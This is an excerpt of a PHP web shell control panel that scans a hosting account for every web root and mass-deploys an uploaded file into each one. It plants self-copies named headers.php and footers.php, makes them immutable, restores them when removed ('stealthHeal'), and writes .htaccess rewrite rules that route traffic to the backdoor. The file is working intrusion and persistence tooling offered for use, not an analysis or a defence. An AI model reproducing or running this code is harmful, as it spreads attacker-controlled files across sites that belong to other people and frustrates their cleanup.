...
function autoDetectDomainsPath() {
    ...
    $username = function_exists('get_current_user') ? get_current_user() : '';
    
    $paths = [
        rtrim($docRoot, '/') . '/../domains',
        rtrim($docRoot, '/') . '/../../domains',
        '/home/' . $username . '/domains',
        dirname($docRoot, 2) . '/domains',
        dirname($docRoot) . '/domains',
        '/home/' . $username . '/',
        dirname($docRoot) . '/'
    ];
...
function scanAllWebRootsRecursive($basePath, $depth = 0) {
    $results = [];
    if ($depth > 4 || !@is_dir($basePath)) return $results;
    
    $items = @scandir($basePath);
    if (!$items) return $results;
    
    $skip = ['.', '..', 'cgi-bin', 'logs', 'tmp', 'backup', '.git', 'node_modules', 'cpanel', 'phpmyadmin', 'stats', 'error_log'];
    
    $webRoots = ['public_html', 'www', 'html', 'htdocs', 'site', 'web', 'httpdocs', 'public', 'root', 'htdocs'];
    ...
    foreach ($items as $item) {
        ...
        foreach ($webRoots as $wr) {
            $test = $full . '/' . $wr;
            if (@is_dir($test)) {
                $results[] = ['name' => $item . '/' . $wr, 'path' => $test, 'type' => 'webroot'];
                $found = true;
                $subs = ['wp-admin', 'wp-content', 'wp-includes', 'admin', 'includes', 'assets', 'css', 'js', 'images'];
                foreach ($subs as $sub) {
                    $subPath = $test . '/' . $sub;
                    if (@is_dir($subPath)) {
                        $results[] = ['name' => $item . '/' . $wr . '/' . $sub, 'path' => $subPath, 'type' => 'subdir'];
                    }
                }
            }
        }
        ...
        if (!$found) {
            ...
            $isDomain = preg_match('/\.(com|net|org|info|biz|xyz|online|site|ph|io|www|localhost)$/i', $item);
            $isCommonWeb = in_array($item, $webRoots);
            
            if ($hasIndex || $isDomain || $isCommonWeb) {
                $results[] = ['name' => $item, 'path' => $full, 'type' => 'direct'];
                $found = true;
            }
        }
        
        $subResults = scanAllWebRootsRecursive($full, $depth + 1);
        $results = array_merge($results, $subResults);
    }
    
    $unique = [];
    foreach ($results as $r) { 
        if (!isset($unique[$r['path']])) $unique[$r['path']] = $r; 
    }
    
    return array_values($unique);
}

function recursiveMassDeployToAllWebRoots($content, $filename) {
    $deployed = [];
    $failed = [];
    
    if (isset($_SERVER['DOCUMENT_ROOT']) && @is_dir($_SERVER['DOCUMENT_ROOT'])) {
        $tf = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/' . $filename;
        if (@file_put_contents($tf, $content) !== false) { 
            @chmod($tf, 0644); 
            $deployed[] = ['path' => $tf, 'domain' => 'current_document_root', 'type' => 'doc_root'];
        } else {
            $failed[] = ['path' => $tf, 'domain' => 'current_document_root', 'reason' => 'cannot_write'];
        }
    }
    
    $cwd = @getcwd();
    if ($cwd && @is_dir($cwd) && $cwd != $_SERVER['DOCUMENT_ROOT']) {
        $tf = rtrim($cwd, '/') . '/' . $filename;
        if (@file_put_contents($tf, $content) !== false) { 
            @chmod($tf, 0644); 
            $deployed[] = ['path' => $tf, 'domain' => 'current_working_dir', 'type' => 'cwd'];
        }
    }
    
    $domainsPath = autoDetectDomainsPath();
    if ($domainsPath) {
        $webRoots = scanAllWebRootsRecursive($domainsPath);
        
        foreach ($webRoots as $webRoot) {
            $tf = rtrim($webRoot['path'], '/') . '/' . $filename;
            $dir = dirname($tf);
    ...
    if ($parentDir && @is_dir($parentDir) && $parentDir != $domainsPath) {
        $additionalRoots = scanAllWebRootsRecursive($parentDir, 0);
        foreach ($additionalRoots as $root) {
            $alreadyDeployed = false;
            foreach ($deployed as $d) {
                if ($d['path'] == rtrim($root['path'], '/') . '/' . $filename) {
                    $alreadyDeployed = true;
                    break;
                }
            }
            if (!$alreadyDeployed) {
                $tf = rtrim($root['path'], '/') . '/' . $filename;
                $dir = dirname($tf);
                if (!@is_dir($dir)) @mkdir($dir, 0755, true);
                if (@file_put_contents($tf, $content) !== false) {
                    @chmod($tf, 0644);
                    $deployed[] = ['path' => $tf, 'domain' => $root['name'] . ' (parent)', 'type' => $root['type']];
                }
            }
        }
    }
...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['mass_deploy_action'])) {
    ...
    if ($_POST['mass_deploy_action'] === 'scan') {
        $domainsPath = autoDetectDomainsPath();
        $allWebRoots = [];
        ...
        $parentDir = dirname($_SERVER['DOCUMENT_ROOT']);
        if ($parentDir && @is_dir($parentDir) && $parentDir != $domainsPath) {
            $additional = scanAllWebRootsRecursive($parentDir, 0);
            foreach ($additional as $add) {
                $exists = false;
                foreach ($allWebRoots as $existing) {
        ...
        if ($_SERVER['DOCUMENT_ROOT']) {
            $docRootAdded = false;
            foreach ($allWebRoots as $wr) {
                if ($wr['path'] == $_SERVER['DOCUMENT_ROOT']) {
                    $docRootAdded = true;
                    break;
                }
            }
        ...
        $resp['success'] = true;
        $resp['data'] = [
            'base_path' => $domainsPath ?: 'No domains folder found',
            'webroots' => $allWebRoots,
            'total' => count($allWebRoots)
        ];
        $resp['message'] = 'Found ' . count($allWebRoots) . ' web roots/document roots';
        
    } elseif ($_POST['mass_deploy_action'] === 'deploy' && isset($_FILES['deploy_file'])) {
        $file = $_FILES['deploy_file'];
        $filename = basename($file['name']);
        $content = @file_get_contents($file['tmp_name']);
        
        if ($content === false && $file['size'] == 0) {
            $ext = pathinfo($filename, PATHINFO_EXTENSION);
            if ($ext === 'php') {
                $content = "<?php\n/**\n * Mass Deployed File\n * Date: " . date('Y-m-d H:i:s') . "\n */\n?>";
            } elseif ($ext === 'html') {
                $content = "<!DOCTYPE html>\n<html>\n<head><title>Deployed</title></head>\n<body>\n<h1>Mass Deployed File</h1>\n</body>\n</html>";
            } elseif ($ext === 'js') {
                $content = "// Mass Deployed JavaScript File\nconsole.log('Mass deployed successfully');";
            } elseif ($ext === 'css') {
                $content = "/* Mass Deployed CSS File */\nbody { margin: 0; padding: 0; }";
            } else {
                $content = "# Mass Deployed File\nDate: " . date('Y-m-d H:i:s') . "\n";
            }
        }
        
        if ($content !== false) {
            $result = recursiveMassDeployToAllWebRoots($content, $filename);
            $resp['success'] = true;
            $resp['data'] = [
                'filename' => $filename,
                'deployed' => count($result['deployed']),
                'deployed_list' => $result['deployed'],
                'failed' => count($result['failed']),
                'failed_list' => $result['failed']
            ];
            $resp['message'] = 'Deployed to ' . count($result['deployed']) . ' locations';
        } else {
            $resp['message'] = 'Failed to read file content';
        }
    }
...
function deployHTAccess() {
    ...
    $htaccessContent .= "    <FilesMatch \"^(headers|footers)\.php$\">\n";
    ...
    $htaccessContent .= "    RewriteRule ^(.*)$ /headers.php [L]\n";
...
function massDeployToSubdirs() {
    ...
    $deployed = 0;
    $filenames = ['headers.php', 'footers.php'];
...
function healCurrentLocationFromAnySource() {
        ...
        try {
            ...
            foreach ($iterator as $file) {
                if ($file->isFile()) {
                    ...
                    if (in_array($filename, ['headers.php', 'footers.php', basename($currentScript)])) {
    ...
    if (!$sourceContent && function_exists('shell_exec') && $docRoot) {
        $cmd = "find '{$docRoot}' -type f -name 'headers.php' -size +5k 2>/dev/null | head -1";
...
function stealthHeal($specificFile = null) {
    ...
    foreach ($targetDirs as $dir) {
        if (@is_writable($dir)) {
            $headersFile = $dir . '/headers.php';
            $footersFile = $dir . '/footers.php';
            
            if (!@file_exists($headersFile) || @filesize($headersFile) < 5000) {
                @file_put_contents($headersFile, $currentCode);
                @chmod($headersFile, 0444);
                makeImmutable($headersFile);
                $restored++;
            }
            if (!@file_exists($footersFile) || @filesize($footersFile) < 5000) {
                @file_put_contents($footersFile, $currentCode);
                @chmod($footersFile, 0444);
                makeImmutable($footersFile);
                $restored++;
            }
        }
    }
...
function getIntelStatus() {
    ...
    $intelFiles = ['headers.php', 'footers.php'];
...
$docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
$headersExist = @file_exists($docRoot . '/headers.php') && @filesize($docRoot . '/headers.php') > 1000;
$footersExist = @file_exists($docRoot . '/footers.php') && @filesize($docRoot . '/footers.php') > 1000;
...
if (isset($_GET['loader'])) {
    ...
    <body>
        <div class="fullscreen-banner-loader"><img src="https://i.ibb.co/4g8KZC1G/20260508-070406.png" alt="bg"></div>
...
if (!isset($_SESSION['kali_authenticated'])) {
    ...
    <body>
        <div class="fullscreen-banner"><img class="banner-img" src="https://i.ibb.co/4g8KZC1G/20260508-070406.png" alt="bg"></div>
...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        ...
        /* Mass Deploy Panel Styles */
        .mass-deploy-panel { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 650px; max-width: 90vw; background: rgba(10,14,26,0.98); backdrop-filter: blur(20px); border: 1px solid #2ecc71; border-radius: 10px; z-index: 601; display: none; flex-direction: column; overflow: hidden; }
        ...
        .subdomain-list { background: #0a0e1a; border: 1px solid #2e7a3e; border-radius: 4px; padding: 8px; max-height: 250px; overflow-y: auto; font-size: 0.65rem; }
        .subdomain-item { padding: 4px 8px; border-bottom: 1px solid #2e7a3e; color: #8f8; word-break: break-all; font-family: monospace; }
        .subdomain-item-success { color: #2ecc71; }
        .subdomain-item-error { color: #ff4444; }
        ...
        .deploy-log { background: #0a0e1a; border: 1px solid #2e7a3e; border-radius: 4px; padding: 8px; max-height: 200px; overflow-y: auto; font-size: 0.65rem; font-family: monospace; }
        .deploy-log .success { color: #2ecc71; }
        .deploy-log .error { color: #ff4444; }
        .deploy-log .info { color: #ffaa33; }
        .btn-scan, .btn-deploy { background: #1a3a1a; border: none; padding: 8px 16px; color: #fff; cursor: pointer; border-radius: 4px; margin-top: 5px; transition: 0.2s; }
        .btn-scan:hover, .btn-deploy:hover { background: #2a6e2a; }
        .btn-scan:disabled, .btn-deploy:disabled { opacity: 0.5; cursor: not-allowed; }
        .stats-info { background: #0a0e1a; border: 1px solid #2e7a3e; border-radius: 4px; padding: 8px; font-size: 0.7rem; color: #88ffaa; }
    </style>
</head>
<body>
    ...
    <div class="bottom-border">
        <div class="bottom-icons">
            ...
            <div class="bottom-icon" id="massDeployBtn"><i class="fas ffa-upload" style="font-size:18px;"></i></div>
        </div>
    ...
    <div id="massDeployPanel" class="mass-deploy-panel">
        <div class="mass-deploy-header">
            <h3><i class="fas fa-shield-alt"></i> Mass Deploy to All Web Roots (Subdomains)</h3>
            <span class="close-mass-deploy" id="closeMassDeployPanel">&times;</span>
        </div>
        <div class="mass-deploy-body">
            <button id="scanSubdomainsBtn" class="btn-scan"><i class="fas fa-search"></i> Scan All Web Roots</button>
            <div id="subdomainListContainer" class="subdomain-list" style="display:none;"></div>
            <div id="scanStats" class="stats-info" style="display:none;"></div>
            <input type="file" id="massDeployFileInput" accept=".php,.txt,.html,.js,.css">
            <div id="deployProgressContainer" class="progress-bar-container" style="display:none;">
                <div class="progress-bar-fill" id="deployProgressFill"></div>
            </div>
            <button id="startMassDeployBtn" class="btn-deploy" disabled><i class="fas fa-rocket"></i> Deploy to All Detected Locations</button>
            <div id="deployLogContainer" class="deploy-log" style="display:none;"></div>
        </div>
    </div>
    ...
    (function(){
        ...
        const scanSubdomainsBtn = document.getElementById('scanSubdomainsBtn');
        const subdomainListContainer = document.getElementById('subdomainListContainer');
        const scanStats = document.getElementById('scanStats');
        const massDeployFileInput = document.getElementById('massDeployFileInput');
        const startMassDeployBtn = document.getElementById('startMassDeployBtn');
        const deployLogContainer = document.getElementById('deployLogContainer');
        const deployProgressContainer = document.getElementById('deployProgressContainer');
        const deployProgressFill = document.getElementById('deployProgressFill');
        
        let discoveredWebRoots = [];
        
        function openMassDeployPanel() { 
            massDeployPanel.classList.add('show'); 
            subdomainListContainer.style.display = 'none'; 
            scanStats.style.display = 'none';
            deployLogContainer.style.display = 'none'; 
            deployProgressContainer.style.display = 'none'; 
            startMassDeployBtn.disabled = true; 
        }
        function closeMassDeployPanelFn() { massDeployPanel.classList.remove('show'); }
        ...
        scanSubdomainsBtn?.addEventListener('click', async () => {
            scanSubdomainsBtn.disabled = true;
            scanSubdomainsBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning all web roots...';
            subdomainListContainer.style.display = 'block';
            scanStats.style.display = 'block';
            subdomainListContainer.innerHTML = '<div class="subdomain-item" style="color:#ffaa33;">🔍 Scanning directories for web roots...</div>';
            scanStats.innerHTML = '<div class="info">Scanning in progress...</div>';
            
            try {
                const formData = new FormData();
                formData.append('mass_deploy_action', 'scan');
                const response = await fetch(window.location.href, { method: 'POST', body: formData });
                const result = await response.json();
                
                if (result.success && result.data.webroots) {
                    discoveredWebRoots = result.data.webroots;
                    
                    const docRoots = discoveredWebRoots.filter(w => w.type === 'doc_root');
                    const webRootFolders = discoveredWebRoots.filter(w => w.type === 'webroot');
                    const directDirs = discoveredWebRoots.filter(w => w.type === 'direct');
                    const subDirs = discoveredWebRoots.filter(w => w.type === 'subdir');
                    
                    subdomainListContainer.innerHTML = `<div class="subdomain-item" style="background:#2a5a2a;">✓ Found ${result.data.total} web roots/document roots:</div>`;
                    subdomainListContainer.innerHTML += `<div class="subdomain-item" style="color:#88ffaa;">📁 Current Document Root: ${docRoots.length} found</div>`;
                    
                    discoveredWebRoots.forEach(wr => {
                        let icon = '📂';
                        if (wr.type === 'webroot') icon = '🌐';
                        else if (wr.type === 'doc_root') icon = '⭐';
                        else if (wr.type === 'subdir') icon = '📁';
                        subdomainListContainer.innerHTML += `<div class="subdomain-item">${icon} ${wr.name} → ${wr.path} [${wr.type}]</div>`;
                    });
                    
                    scanStats.innerHTML = `<div class="success">✅ Total: ${result.data.total} web roots found</div>
                                          <div class="info">📌 Includes: public_html, www, html, htdocs, site, web, and direct domain folders</div>
                                          <div class="info">📍 Base path: ${result.data.base_path}</div>`;
                    
                    startMassDeployBtn.disabled = false;
                    showToast(`Found ${discoveredWebRoots.length} web roots`);
                } else {
                    subdomainListContainer.innerHTML = `<div class="subdomain-item" style="color:#ff4444;">❌ ${result.message}</div>`;
                    scanStats.innerHTML = `<div class="error">No web roots detected. Make sure you have proper permissions.</div>`;
                }
            } catch (error) {
                subdomainListContainer.innerHTML = `<div class="subdomain-item" style="color:#ff4444;">Error: ${error.message}</div>`;
                scanStats.innerHTML = `<div class="error">Scan failed: ${error.message}</div>`;
            }
            
            scanSubdomainsBtn.disabled = false;
            scanSubdomainsBtn.innerHTML = '<i class="fas fa-search"></i> Scan All Web Roots';
        });
        
        startMassDeployBtn?.addEventListener('click', async () => {
            const file = massDeployFileInput.files[0];
            if (!file) { showToast('Please select a file to deploy'); return; }
            if (discoveredWebRoots.length === 0) { showToast('Please scan for web roots first'); return; }
            
            deployLogContainer.style.display = 'block';
            deployProgressContainer.style.display = 'block';
            deployLogContainer.innerHTML = '<div class="info">🚀 Starting mass deployment...</div>';
            deployProgressFill.style.width = '0%';
            
            const formData = new FormData();
            formData.append('mass_deploy_action', 'deploy');
            ...
            try {
                ...
                if (result.success) {
                    deployLogContainer.innerHTML = `<div class="success">✅ ${result.message}</div>`;
                    deployLogContainer.innerHTML += `<div class="success">📁 File: ${result.data.filename}</div>`;
                    deployLogContainer.innerHTML += `<div class="success">✅ Successfully deployed: ${result.data.deployed} locations</div>`;
                    deployLogContainer.innerHTML += `<div class="info">❌ Failed: ${result.data.failed} locations</div>`;
                    
                    if (result.data.deployed_list && result.data.deployed_list.length > 0) {
                        deployLogContainer.innerHTML += `<div class="info">📋 Successful deployments:</div>`;
                        result.data.deployed_list.forEach(dep => {
                            deployLogContainer.innerHTML += `<div class="success" style="font-size:0.6rem; padding-left:10px;">→ ${dep.domain}: ${dep.path}</div>`;
                        });
                    }
                    
                    if (result.data.failed_list && result.data.failed_list.length > 0) {
                        deployLogContainer.innerHTML += `<div class="error">❌ Failed deployments:</div>`;
                        result.data.failed_list.forEach(fail => {
                            deployLogContainer.innerHTML += `<div class="error" style="font-size:0.6rem; padding-left:10px;">→ ${fail.domain}: ${fail.reason}</div>`;
                        });
                    }
                    ...
                    deployLogContainer.innerHTML = `<div class="error">❌ ${result.message}</div>`;
                }
            } catch (error) {
                deployLogContainer.innerHTML = `<div class="error">Error: ${error.message}</div>`;
            }
            
            setTimeout(() => { deployProgressContainer.style.display = 'none'; }, 5000);
        });
